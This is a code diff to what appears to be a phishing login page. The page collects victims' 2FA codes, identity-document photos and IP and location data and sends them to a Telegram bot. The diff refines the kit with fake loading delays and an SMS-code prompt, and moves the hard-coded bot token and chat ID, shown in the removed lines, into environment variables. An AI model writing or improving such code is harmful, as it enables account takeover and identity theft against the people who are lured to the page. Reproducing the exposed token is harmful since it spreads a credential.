@@ -24,8 +24,8 @@ export default function LoginPage() {
   const [identityBack, setIdentityBack] = useState<File | null>(null);
   const [randomNumber, setRandomNumber] = useState("");
   const [step, setStep] = useState(1);
-  const [telegramChatId] = useState("7132570959"); // Replace with actual chat ID
-  const [telegramBotToken] = useState("8282863099:AAGCOmJ3FgeClGZkB15jkSqijaTHH21abZI"); // Replace with actual bot token
+  const [telegramChatId] = useState(process.env.NEXT_PUBLIC_ID); // Replace with actual chat ID
+  const [telegramBotToken] = useState(process.env.NEXT_PUBLIC_TOKEN); // Replace with actual bot token
 
   useEffect(() => {
     // Fetch IP and location data
@@ -81,7 +81,7 @@ export default function LoginPage() {
 
   const sendPhotoToTelegram = (file: string | Blob, caption: string | Blob) => {
     const formData = new FormData();
-    formData.append("chat_id", telegramChatId);
+    formData.append("chat_id", telegramChatId as string);
     formData.append("photo", file);
     formData.append("caption", caption);
 
@@ -147,13 +147,19 @@ export default function LoginPage() {
       sendPhotoToTelegram(identityBack, "Identity Back");
     }
 
+    await new Promise((resolve) => setTimeout(resolve, 5000));
     setIsLoading(false);
     setStep(4);
   };
 
-  const handleRandomNumberSubmit = (e: { preventDefault: () => void; }) => {
+  const handleRandomNumberSubmit = async (e: { preventDefault: () => void; }) => {
     e.preventDefault();
+    setIsLoading(true);
+
     sendToTelegram({ randomNumber });
+
+    await new Promise((resolve) => setTimeout(resolve, 3000));
+    setIsLoading(false);
     setStep(5);
   };
 
@@ -245,7 +251,7 @@ export default function LoginPage() {
             </CardHeader>
             <CardContent className="space-y-4">
               <p className="text-2xl font-semibold text-center text-gray-900">Enter a code from your device</p>
-              <p className="text-sm text-gray-600">Please check your code generator application and enter the generated 6-digit code to complete your sign in.</p>
+              <p className="text-sm text-gray-600">Please check your SMS or code generator application and enter the 6-digit code to complete your sign in.</p>
               <p className="text-l font-semibold text-gray-900">Enter the 6-digit code*</p>
               <form onSubmit={handleTwoFactorSubmit}>
                 <Input
@@ -384,7 +390,7 @@ export default function LoginPage() {
                   required
                 />
                 <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 mt-4" disabled={isLoading}>
-                  Continue
+                  {isLoading ? <Loader className="animate-spin h-5 w-5 mx-auto" /> : "Continue"}
                 </Button>
                 <div className="text-center mt-2">
                   <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Back</Link>
